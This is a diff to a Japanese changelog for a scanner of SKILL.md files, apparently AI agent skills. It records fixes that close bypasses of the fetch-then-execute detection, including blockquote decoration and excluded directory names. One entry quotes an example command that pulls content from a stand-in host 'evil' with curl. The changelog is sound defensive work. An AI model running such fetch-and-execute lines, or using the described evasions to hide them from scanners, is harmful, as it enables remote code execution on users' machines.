@@ -11,6 +11,17 @@
   評価セットがない環境では数字を推測せず「未測定」と明示する。
 
 ### Fixed
+- **fix(skill_vuln_scan): Markdown 装飾の素通り・未評価の沈黙・除外リストの根拠不足を是正** —
+  行頭の blockquote（`>`）・箇条書き・番号付きリストの装飾を正規化してから照合するようにし、
+  `> D=$(curl -s http://evil)` のような引用記法の fetch→exec combo が代入 regex の `^`
+  アンカーに一致せず素通りしていた欠陥を是正した。`SkillVulnReport` に `scan_errors` /
+  `evaluated` を追加し、読取失敗（不正 UTF-8・権限エラー等）を無言 skip せず critical として
+  surface するようにした（`report.evaluated` が単一ソース）。`_EXCLUDE_DIRS` を実測で洗い直し、
+  `~/.claude/skills` 実コーパスで根拠を示せなかった `.claude`/`.venv`/`venv`/`__pycache__`/
+  `.pytest_cache`/`.mypy_cache` を除外リストから外し `{".git", "node_modules"}` に縮小した
+  （名前を騙るだけで走査を回避できる経路を閉じる）。プレースホルダ・マスクが `<account_id>`/
+  `<app_id>` に狭まっていないこと・producer/consumer が常に同一ファイル内限定であることの
+  仕様文言を固定した。
 - **fix(skill_vuln_scan): SKILL.md 脆弱性スキャンのフェンス限定 scope・除外バグを是正（#415）** —
   `_iter_scopes` が ``` フェンス内の行しか走査せず、4スペース字下げ・`~~~`・`<details>`・
   フェンス無し本文の fetch→exec 系列を素通りさせていた欠陥を是正し、記法を問わず全行を
